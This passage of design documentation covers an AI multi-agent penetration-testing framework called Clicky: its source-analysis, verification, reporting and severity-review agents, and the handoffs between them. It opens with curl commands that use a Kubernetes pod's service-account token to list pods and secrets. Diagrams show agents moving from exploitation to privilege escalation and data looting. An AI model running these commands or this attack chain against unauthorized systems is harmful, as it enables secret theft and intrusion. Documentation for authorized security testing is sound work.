### Kubernetes Enumeration

**Service Account Tokens:**

Every pod in Kubernetes gets a service account token mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`. This token can often access the K8s API.

```bash
# Inside a pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# List pods (if allowed)
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/pods

# List secrets (high value!)
curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/secrets
```

---

## Source Analyzer Agent

### Purpose

The Source Analyzer Agent is Clicky's white-box counterpart to the black-box `recon-agent`/`exploit-agent` pair: instead of probing a live target blind, it reads the target's actual source first and turns what it finds into targeted, prioritized attack vectors - a known sink beats a black-box guess. It never exploits anything itself; it reports file/line/sink-level findings for `exploit-agent` to act on.

### When It Runs

```mermaid
flowchart TD
    START["/pentest invocation"] --> EXPLICIT{"Context has<br/>whitebox/source/repo?"}
    EXPLICIT -->|Yes| RUN["Launch source-analyzer-agent<br/>(parallel with recon-agent)"]
    EXPLICIT -->|No| RECON["recon-agent runs its<br/>normal .git/config probe"]
    RECON --> EXPOSED{"git_exposure_detected?"}
    EXPOSED -->|true| SCOPE{"authorized_techniques<br/>non-empty?"}
    EXPOSED -->|false| SKIP["No white-box analysis this run"]
    SCOPE -->|check passes or empty| RUN2["Launch source-analyzer-agent<br/>(opportunistic)"]
    SCOPE -->|denied| SKIP
```

Two trigger paths, never a blanket "always check" default: an explicit operator request (`whitebox`/`source: <path>`/`repo: <url>` in the `/pentest` context argument), or an opportunistic trigger off `recon-agent`'s existing `.git/config` probe - at essentially zero extra recon cost.

### Analysis Pipeline

1. **Acquire** - local path used in place, a git URL is cloned, or an exposed `.git` on a live target is dumped (`skills/source-code-analysis/scripts/source-scanner.sh`).
2. **Taint-style scan** - regex/proximity-based source-to-sink mapping (untrusted input near a dangerous sink in the same file): SQLi, command/code injection, XSS, path traversal, SSRF, hardcoded secrets. Confidence is `high` (source and sink both found) or `low` (sink only) - never reported as more certain than that.
3. **Dependency scan** - `trivy fs` (preferred) or per-ecosystem fallbacks (`npm audit`, `pip-audit`, etc.), flagging known-CVE dependencies.
4. **Merge and map** - findings that can be tied to a live route/endpoint get `suggested_attack_vector.maps_to_service` populated, which is what lets `decision-agent` promote them above a black-box guess.

### Hand-off, Not a Verdict

Every source-derived finding is `confidence: "likely"` at best until confirmed live - `decision-agent` (Step 1.5) reads `source_findings.json` as a parallel input and promotes anything with a populated `maps_to_service` to the top of the attack sequence, but `exploit-agent` still has to confirm it against the real target, and the resulting claim flows through the same Verification Agent pipeline as any other finding (see below). A file-and-line hint is a strong lead, not a finished exploit.

---

## Verification Agent

### Purpose

Every other agent in the pipeline reports its own findings with nothing independently checking them - the single most common failure mode across AI pentesting tools generally: an agent honestly believes it succeeded but misread output, hit a false positive, or over-generalized. The Verification Agent is the check on that: an independent reviewer, modeled on the "independent reviewer" pattern used by leading AI pentesting frameworks, that judges whether one specific claimed finding is actually substantiated - and where safe, re-confirms it itself.

### Two-Tier Validation

```mermaid
flowchart LR
    FIND["Agent logs a finding<br/>via session-manager.sh log"] --> T1

    subgraph T1["Tier 1 - always on, cheap"]
        CHECK["finding-validator.sh:<br/>does evidence.command appear<br/>in the trace log, error-free?"]
    end

    T1 -->|pass / fail / no_evidence| GATE{"CRITICAL or HIGH,<br/>and not ruled out?"}
    GATE -->|no| REPORT
    GATE -->|yes, dedup by vuln class| T2

    subgraph T2["Tier 2 - Verification Agent"]
        RAW["Reads raw trace evidence only -<br/>NOT the original agent's confidence/narrative"]
        REATTEMPT["Re-attempts a minimal repro<br/>if safe and idempotent"]
        VERDICT["confirmed / refuted / inconclusive"]
        RAW --> REATTEMPT --> VERDICT
    end

    T2 --> REPORT["Report Agent invokes<br/>report-generator.sh:<br/>Confirmed Findings vs.<br/>Unverified / Needs Manual Review"]
```

It is deliberately given only the finding's severity, description, evidence command, and the raw trace entry - never the originating agent's confidence rating or reasoning, to avoid anchoring on someone else's framing. Its tools are limited to the gateway's `execute_command`, `read_file`, and `search_files` - no write/register/fetch capability, no `Task` - so it can judge and minimally re-verify, but never "fix" a finding or spawn further agents.

Tier 2 only answers whether a finding is *true*. Whether a true finding's *severity* is proportionate to real-world risk is a separate question, answered downstream of `report-agent` by [Severity Analyst Agent](#severity-analyst-agent) (Tier 3) - see that section below.

### Why `inconclusive` Is a Real Answer

The agent is explicitly instructed not to default to `confirmed` when in doubt: if a re-attempt isn't safe (destructive, non-idempotent, or access has since been lost), it says so rather than guessing. Any CRITICAL/HIGH finding that comes back `refuted`, or that Tier 1 flagged as `fail`, is a hard gate in `report-generator.sh validate` - it cannot appear in the report's "Confirmed Findings" section.

---

## Report Agent

### Purpose

Every finding that survives Tier 1/Tier 2 validation still has to become an actual client-facing deliverable - CVSS scores, OWASP/CIS/NIST framework mapping, a risk matrix, and a narrative a non-technical stakeholder can act on. Before this agent existed, that compilation happened inside the same orchestrator context that had just spent an entire engagement issuing exploitation commands and tracking credentials and attack-chain state - `commands/pentest.md` Step 10 ran `report-generator.sh` directly and then wrote the framework-mapping narrative itself. The Report Agent gives reporting the same treatment the Verification Agent already gave finding review: a fresh, single-purpose context whose only job is turning already-finalized session data into a report, with no operational history to bias phrasing or tempt it into re-litigating a finding that was already settled upstream.

### From Validated Findings to a Delivered Report

```mermaid
flowchart TD
    DISPATCH["Orchestrator Task-dispatches<br/>report-agent with $SESSION_ID,<br/>$SESSION_DIR, format, interop flag"] --> VALIDATE

    subgraph ReportAgent["Report Agent"]
        VALIDATE["execute_command:<br/>report-generator.sh validate<br/>--session-id $SESSION_ID"]
        VALIDATE -->|FAIL| SURFACE["Surface exactly which findings<br/>failed and why - stop, no Task<br/>tool to retry or override"]
        VALIDATE -->|PASS| GENERATE["execute_command:<br/>report-generator.sh generate<br/>--format ... --output final_report.md"]
        GENERATE --> INTEROP{"Interop exports<br/>requested?"}
        INTEROP -->|yes| CONVERT["execute_command:<br/>interop-formats.sh sarif /<br/>sbom-partial / aibom-partial"]
        INTEROP -->|no| NARRATIVE
        CONVERT --> NARRATIVE["Compile CVSS/OWASP/CIS/NIST<br/>narrative, write_file back<br/>into final_report.md"]
    end

    SURFACE --> RESULT1["Return to Orchestrator:<br/>FAIL + failing finding IDs"]
    NARRATIVE --> RESULT2["Return to Orchestrator:<br/>report path + short summary"]
```

### Why It Can't Re-Judge Findings

The Report Agent has no `Task` tool and is never given raw trace evidence the way the Verification Agent is - only `findings.json`, already carrying each finding's `validation.tier1_trace_check`/`tier2_review` verdicts. If `report-generator.sh validate` reports a FAIL (a CRITICAL/HIGH finding that failed Tier 1 or was refuted by Tier 2), the agent surfaces exactly which findings and why, and stops - it cannot retry, override, or promote a refuted finding into "Confirmed Findings" itself. That gate lives in `report-generator.sh`'s own structural check, not in this agent's judgment, so there's no path for it to talk itself past a FAIL.

### Scope Boundary

The Report Agent wires into `commands/pentest.md` only. `workflows/pentest-parallel.js`'s dynamic-workflow stages have no confirmed mechanism to reference an `agents/*.md` file by name - its own `verification` stage already works around this by inlining a condensed charter rather than dispatching `verification-agent` via `Task`, and its reporting stage follows that same pre-existing pattern. That's a constraint of the parallel workflow engine, not something this agent changes.

Report Agent is no longer the last thing that touches a session before it's considered complete: `commands/pentest.md` Step 11 dispatches [Severity Analyst Agent](#severity-analyst-agent) against the report this agent just drafted, before the engagement is considered done.

---

## Severity Analyst Agent

### Purpose

Tier 1 and Tier 2 both answer "is this finding true?" Neither ever asks "is the severity assigned to a true finding proportionate to real-world risk?" - an honestly-confirmed self-XSS reported as CRITICAL passes both cleanly and still misleads a client. This is a real, measured, industry-wide failure mode in AI-generated pentest reporting, not a hypothetical one (see `agents/severity-analyst-agent.md`'s "Why This Exists" for the research citations). The Severity Analyst Agent is Tier 3: an adversarial senior-analyst pass over the *whole drafted report* - not one finding at a time - specifically hunting for inflated severity, with a report-level "slop score" quantifying how much it found.

### Why Cross-Model-Family, By Default

The research this design is based on ("Refute-or-Promote," a real adversarial multi-agent review campaign) found that naively adding an adversarial reviewer isn't enough by itself: in one documented case, 80+ agents - including agents explicitly tasked with adversarial review - unanimously endorsed a vulnerability that didn't exist, because same-model-family reviewers share correlated blind spots that get *worse* with capability, not better. So this agent is dispatched two different ways depending on what's available:

```mermaid
flowchart TD
    DRAFT["report-agent drafts<br/>final_report.md"] --> CHECK{"codex CLI<br/>installed?"}
    CHECK -->|Yes| CROSS["tools/run-severity-critique.sh:<br/>codex exec, no MCP tools needed<br/>(report is already redacted text)"]
    CHECK -->|No| SAME["Task-dispatch severity-analyst-agent<br/>as an ordinary same-family subagent"]
    CROSS --> OUT["severity_critique.json<br/>review_mode: cross_family_codex"]
    SAME --> OUT2["severity_critique.json<br/>review_mode: same_family_fallback"]
```

The cross-family path needs no gateway/MCP access at all - by the time report-agent has drafted a report, its content is already redacted/tokenized, so it's safe to hand directly to an external model with zero target/credential exposure. The same-family fallback is still useful (the kill-mandate/cold-start framing below does real work on its own), just a weaker calibration signal - which is why every review is tagged with which path produced it, rather than blending both into one number.

### Kill Mandate, With a Counterweight

Unlike Tier 2's "confirmed/refuted/inconclusive" framing, this agent's default posture is explicitly prosecutorial: find every reason a severity claim is unsupported, not "double-check it looks reasonable." It checks for Base-score-only scoring (ignoring compensating controls and realistic preconditions), unevidenced "could-chains" stacked into a certain-sounding outcome, and business-impact language stronger than what was actually demonstrated. The counterweight, because a purely downgrade-seeking reviewer creates its own failure mode (research on this exact problem found a false-positive-optimized critic suppressed over 20% of *genuinely real* findings in its best configuration): it's also instructed to flag under-scored findings, not just over-scored ones.

### The Slop Score

A 0-100 report-level score, weighted so that inflating the top of the severity scale (CRITICAL → MEDIUM) counts far more than inflating the bottom (MEDIUM → LOW) - see `agents/severity-analyst-agent.md`'s exact formula. Documented there as a tunable first pass, not a fixed law, meant to be revisited against real accumulated calibration data the same way every other heuristic in Clicky already is.

### The Feedback Loop

This is what makes Tier 3 a calibration mechanism, not a one-off critique. Every finding's delta is logged (`skills/session-management/scripts/severity-review-logger.sh`) to that session's `logs/severity_review.jsonl`, then aggregated across every session (`skills/session-management/scripts/severity-calibration-aggregator.sh`) into `.severity-calibration.json` - structurally identical to how `attempt-aggregator.sh` already computes real per-service success rates for `skills/htb-decision-tree` (same min-sample-size floor, same "insufficient_data" honesty over a misleadingly precise number). `report-agent` reads this file back on future engagements to flag categories it has historically over-scored - the actual mechanism that tunes the *reporting* agent's own judgment over time, not just this reviewing one.

### What It Never Does

Same restricted-reviewer posture as Verification Agent, one level further: no `write_file` (it argues its case in `rationale`, it doesn't rewrite anything), no `execute_command` at all (unlike Tier 2, nothing here is ever re-run live - it only reads already-drafted text and already-validated JSON), no `Task` tool. Its recommendation is surfaced in the report as a visible "Independent Severity Review" section, never silently substituted for the original severities - the same transparency principle the existing "Unverified / Needs Manual Review" section already uses. An operator who disagrees with it is allowed to.

### Scope Boundary

Wires into `commands/pentest.md` Step 11 only, same constraint as Report Agent - `workflows/pentest-parallel.js` has no confirmed mechanism to invoke it yet.

---

## Agent Interaction Patterns

### Sequential Handoff

Most common pattern - one agent completes, hands off to the next:

```mermaid
sequenceDiagram
    participant O as Orchestrator
    participant R as Recon
    participant D as Decision
    participant E as Exploit
    participant P as Privesc
    participant L as Loot

    O->>R: Enumerate target
    R-->>O: Services found

    O->>D: Analyze services
    D-->>O: Attack plan

    O->>E: Execute plan
    E-->>O: Shell obtained

    O->>P: Escalate privileges
    P-->>O: Root access

    O->>L: Extract data
    L-->>O: Loot collected
```

### Parallel Execution

When tasks are independent, agents run simultaneously:

```mermaid
sequenceDiagram
    participant O as Orchestrator
    participant R as Recon
    participant C as Cloud Recon

    O->>R: Enumerate network services
    O->>C: Enumerate cloud services

    par Parallel Execution
        R->>R: nmap scan
        C->>C: Cloud detection
    end

    R-->>O: Network services
    C-->>O: Cloud services

    Note over O: Combine results for analysis
```

### Feedback Loop

When attacks fail, the system loops back:

```mermaid
sequenceDiagram
    participant O as Orchestrator
    participant D as Decision
    participant E as Exploit

    O->>D: Analyze services
    D-->>O: Attack plan (3 priorities)

    O->>E: Try Priority 1
    E-->>O: Failed

    O->>D: P1 failed, what next?
    D-->>O: Try Priority 2

    O->>E: Try Priority 2
    E-->>O: Failed

    O->>D: P2 failed, what next?
    D-->>O: Try Priority 3

    O->>E: Try Priority 3
    E-->>O: Success! Shell obtained

    O->>O: Proceed to privesc
```
